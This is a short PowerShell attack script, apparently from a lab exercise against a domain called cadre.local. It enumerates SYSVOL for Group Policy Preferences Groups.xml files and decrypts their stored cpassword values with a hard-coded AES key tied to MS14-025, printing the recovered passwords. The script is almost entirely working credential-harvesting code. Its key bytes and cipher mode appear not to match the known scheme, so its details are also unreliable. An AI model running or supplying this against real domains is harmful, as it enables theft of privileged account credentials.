# GPP Stored Password (Groups.xml) — ws01 native, any domain user
# Reads the GPP Groups.xml preference from SYSVOL and decrypts cpassword (MS14-025 static AES key).
$ErrorActionPreference = 'Continue'

Write-Output '=== GPP: enumerate SYSVOL Groups.xml + decrypt cpassword ==='

$sysvolRoot = '\\dc01.cadre.local\SYSVOL\cadre.local\Policies'
if (-not (Test-Path $sysvolRoot)) { Write-Output 'SYSVOL_UNREACHABLE'; exit 1 }
Write-Output "SYSVOL_OK|$sysvolRoot"

$gpp = Get-ChildItem -Path $sysvolRoot -Recurse -Filter 'Groups.xml' -ErrorAction SilentlyContinue
if (-not $gpp) { Write-Output 'NO_GROUPS_XML'; exit 1 }
foreach ($g in $gpp) {
  Write-Output "GROUPS_XML|$($g.FullName)"
  [xml]$xml = Get-Content $g.FullName -Raw
  foreach ($u in $xml.Groups.User) {
    Write-Output "GPP_USER|$($u.name)"
    $cp = $u.Properties.cpassword
    if (-not $cp) { Write-Output 'NO_CPASSWORD'; continue }
    Write-Output "CPASSWORD|$cp"
    try {
      $bytes = [Convert]::FromBase64String($cp)
      # MS14-025 static AES key
      $key = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0d,0x8e,0x2f,
                     0x0b,0x3c,0x9c,0x5a,0x2c,0xa1,0xf3,0xdb,0xd7,0xd9,0xc2,0xd1,0xe8,0xc0,0xc0,0x4a)
      $aes = [System.Security.Cryptography.Aes]::Create()
      $aes.Key = $key
      $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
      $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
      $dec = $aes.CreateDecryptor()
      $plain = $dec.TransformFinalBlock($bytes, 0, $bytes.Length)
      $pw = [System.Text.Encoding]::Unicode.GetString($plain)
      $pw = $pw.TrimEnd([char]0)
      Write-Output "DECRYPTED_PW|$pw"
    } catch { Write-Output "DECRYPT_FAIL|$($_.Exception.Message)" }
  }
}
Write-Output 'GPP_DONE'
